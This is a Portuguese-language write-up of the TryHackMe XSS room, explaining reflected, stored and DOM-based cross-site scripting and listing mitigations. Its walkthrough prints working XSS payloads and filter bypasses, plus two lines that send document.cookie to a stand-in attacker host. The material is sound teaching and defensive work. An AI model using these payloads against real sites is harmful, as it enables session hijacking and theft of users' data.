# Write-up: TryHackMe — XSS (Cross-Site Scripting)

**Plataforma:** TryHackMe  
**Sala:** Introduction to Cross-site Scripting (XSS) — Web Fundamentals / Web Hacking  

---

## 1. Introdução e objetivos da sala

A sala **Cross‑Site Scripting (XSS)** explora vulnerabilidades que permitem a execução de código JavaScript malicioso no navegador de outros usuários. O objetivo é entender os vetores (input refletido, armazenado e baseado no DOM), como identificar e explorar XSS em aplicações web e, principalmente, como mitigar esses riscos.

Objetivos específicos:
- Identificar os três tipos principais de XSS: Reflected, Stored (Persistent), DOM-based.
- Construir payloads simples para testar a presença de XSS.
- Entender impactos (roubo de cookies, session hijacking, defacement, CSRF relay).
- Aprender contramedidas efetivas (escaping, Content Security Policy, sanitização).

---

## 2. Ferramentas utilizadas

* Navegador com DevTools — inspecionar DOM, requests, cookies e console.  
* Burp Suite / proxy HTTP — interceptar e modificar requisições/respostas.  
* `curl` — reproduzir requisições simples.  
* AttackBox / VM do TryHackMe — para testes em ambiente controlado.

---

## 3. Conceitos chave

### Tipos de XSS
- **Reflected XSS (Non-Persistent):** o payload é enviado na requisição (ex.: parâmetro `q` na URL) e refletido na resposta imediatamente — ideal para phishing links ou engenharia social.  
- **Stored XSS (Persistent):** payloads são armazenados no servidor (ex.: comentários, posts) e servidos a outros usuários — maior impacto potencial.  
- **DOM-based XSS:** a vulnerabilidade existe no lado do cliente — o JavaScript da página processa dados do URL, fragment ou outros inputs e injeta no DOM sem sanitização.

### Impactos típicos
- Roubo de Cookies/Session tokens (`document.cookie`) e assumção de sessão.  
- Keylogging, exfiltração de dados sensíveis mostrados na página.  
- Redirecionamento para sites de phishing.  
- Abuso para realizar ações em nome do usuário (CSRF + XSS).  
- Pivot para carregar payloads mais complexos (web shells, etc).

### Sinais de vulnerabilidade
- Parâmetros refletidos na resposta sem escape (ex.: `?search=<script>alert(1)</script>` produz um alert).  
- Inputs que aparecem no DOM (innerHTML) sem sanitização.  
- Campos de formulário que quando visualizados por outro usuário executam scripts.

---

## 4. Metodologia e resolução (walkthrough)

> Exemplo prático típico de um laboratório XSS em TryHackMe.

### Passo 1 — Identificação rápida
1. Procure campos que reflitam input: parâmetros de URL, campos de busca, comentários, perfis de usuário.  
2. Teste payloads simples:
```html
<script>alert('XSS')</script>
```
Se a página executa o `alert`, há XSS. Em muitos labs o `alert` é substituído por uma flag para tornar a exploração guiada.

### Passo 2 — Diferenciar o tipo
- Se o payload aparece apenas na resposta imediata ao clicar em um link: **Reflected**.  
- Se o payload persiste e aparece para outros usuários ou mesmo após reload: **Stored**.  
- Se a resposta não contém o payload mas o console/DOM executa algo quando você altera o fragment/URL: **DOM-based**.

### Passo 3 — Payloads úteis e bypasses
Nem sempre `<script>` funciona — muitas aplicações filtram tags. Alguns payloads alternativos:

**A. Simples (HTML)**
```html
<script>alert(1)</script>
```

**B. Img onerror**
```html
<img src=x onerror=alert('XSS')>
```

**C. Event handler em atributos**
```html
"><svg/onload=alert(1)//
```

**D. JavaScript URI (reflected contexts)**
```html
<a href="javascript:alert(1)">click</a>
```

**E. DOM-based (inserir no fragment/hash)**
```
http://site/?q=<svg/onload=alert(1)>
# or
http://site/#<script>alert(1)</script>
```

**F. Cookies exfiltration (apenas em teste autorizado)**
```js
<script>
new Image().src="http://attacker.com/steal?c="+document.cookie
</script>
```

### Passo 4 — Exploração prática (exemplo)
- Envia-se um comentário com payload `<img src=x onerror=fetch('http://attacker/steal?c='+document.cookie)>`.
- Outro usuário/viewer carrega a página; o navegador do victim executa o fetch e envia cookie para o atacante.
- Em labs, essa técnica costuma revelar uma flag no servidor atacante ou diretamente na página.

---

## 5. Técnicas úteis para testes

- **DOM inspection:** `document.querySelector(...)`, `inspect element` para ver onde o input é inserido.  
- **MutationObserver / console.log:** acompanhar mudanças no DOM que possam inserir payloads.  
- **Burp Intruder / Repeater:** automatizar envio de variantes de payloads.  
- **CSP bypass testing:** verificar se a página tem Content-Security-Policy que bloqueia `eval`, inline scripts etc; testar fontes externas permitidas.

---

## 6. Mitigações e recomendações

1. **Output Encoding / Escaping:** escapar corretamente os dados antes de inseri-los no HTML, atributos, JS, CSS e URL contexts:
   - HTML escape (e.g. `&lt;`, `&gt;`) para conteúdo HTML.
   - Attribute escape para valores de atributos.
   - JavaScript string escape ao inserir dentro de scripts.
2. **Use Safe APIs:** evite `innerHTML` e prefira `textContent` / `setAttribute`. Para templates, use bindings que façam escape automático.  
3. **Content Security Policy (CSP):** implementar políticas que bloqueiem inline scripts (`'unsafe-inline'`) e limitem fontes de scripts a domínios confiáveis; não é uma solução completa, mas reduz impacto.  
4. **Sanitização de entradas:** quando precisar permitir HTML, use bibliotecas de sanitização bem testadas (DOMPurify, sanitize-html) para remover atributos/event handlers perigosos.  
5. **HttpOnly cookies:** marque cookies de sessão como `HttpOnly` para reduzir roubo via `document.cookie` (não impede XSS mas limita alguns vetores).  
6. **SameSite cookies:** para reduzir CSRF e certos exfiltration combos.  
7. **Validação e Content-type:** validar tamanho/charset/input e garantir `Content-Type` corretos.  
8. **WAF e detecção:** regras para detectar padrões de XSS em payloads, embora não substituam boas práticas de codificação.

---

## 7. Lições aprendidas e conclusão

XSS é uma vulnerabilidade com impacto alto e exploração muitas vezes trivial. A sala permite praticar identificação em diferentes contextos (reflected, stored, DOM) e mostra como o simples ato de inserir dados não confiáveis no DOM sem escape pode comprometer usuários.  

Para desenvolvedores: priorize escaping no output, evite APIs inseguras e aplique CSP. Para testadores: pense em todos os contextos onde o input pode ser re-inserido (HTML, atributos, JS, CSS, URL) e construa payloads adaptados a cada contexto.

---
